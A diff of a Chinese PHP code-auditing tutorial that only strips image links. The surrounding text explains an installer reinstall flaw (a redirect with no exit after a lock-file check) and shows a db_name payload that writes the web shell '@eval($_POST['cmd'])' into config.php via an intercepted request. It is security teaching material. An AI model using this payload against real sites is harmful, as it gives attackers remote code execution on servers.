@@ -10,7 +10,6 @@
 
 ## 安装功能简介
 
-![](img/0ca7da7be87ff1765fee68c763417348_3.png)
 
 一般PHP程序都有一个初始的安装功能。这个功能主要执行两项任务：
 1.  数据库的初始化，包括写入数据库结构和初始信息。
@@ -46,11 +45,9 @@ if (file_exists(‘lock’)) {
 }
 ```
 
-![](img/0ca7da7be87ff1765fee68c763417348_5.png)
 
 这段代码检查是否存在 `lock` 文件。如果存在，则跳转到首页。这里我们发现了第一个漏洞：**判断Lock文件后跳转未结束进程**。代码使用了 `header` 进行跳转，但没有调用 `exit` 或 `die`，这意味着跳转指令发出后，后面的PHP代码依然会继续执行。
 
-![](img/0ca7da7be87ff1765fee68c763417348_7.png)
 
 ### 第三步：跟踪重装流程
 
@@ -80,11 +77,9 @@ if (file_exists(‘lock’)) {
 
 ![](img/0ca7da7be87ff1765fee68c763417348_11.png)
 
-![](img/0ca7da7be87ff1765fee68c763417348_13.png)
 
 ### 第四步：构造利用Payload (EXP)
 
-![](img/0ca7da7be87ff1765fee68c763417348_15.png)
 
 我们的目标是：通过控制 `db_name` 参数，在 `config.php` 文件中写入恶意PHP代码。
 
@@ -102,14 +97,12 @@ $db_name=‘我们输入的db_name’;
 ?>
 ```
 
-![](img/0ca7da7be87ff1765fee68c763417348_19.png)
 
 为了写入一句话木马，我们可以构造这样的 `db_name` 值：
 ```
 ‘;@eval($_POST[‘cmd’]);//
 ```
 
-![](img/0ca7da7be87ff1765fee68c763417348_21.png)
 
 ![](img/0ca7da7be87ff1765fee68c763417348_23.png)
 
@@ -129,11 +122,9 @@ $db_name=‘’;@eval($_POST[‘cmd’]);//’;
 ```
 这样，我们就成功注入了一句话木马。
 
-![](img/0ca7da7be87ff1765fee68c763417348_27.png)
 
 ### 第五步：漏洞验证与利用
 
-![](img/0ca7da7be87ff1765fee68c763417348_29.png)
 
 1.  **拦截请求**：使用Burp Suite等工具拦截安装过程中提交表单的POST请求。
 2.  **修改参数**：将 `db_name` 参数的值替换为我们构造的Payload。
@@ -144,7 +135,6 @@ $db_name=‘’;@eval($_POST[‘cmd’]);//’;
 
 ### 第六步：漏洞修复
 
-![](img/0ca7da7be87ff1765fee68c763417348_33.png)
 
 ![](img/0ca7da7be87ff1765fee68c763417348_35.png)
 
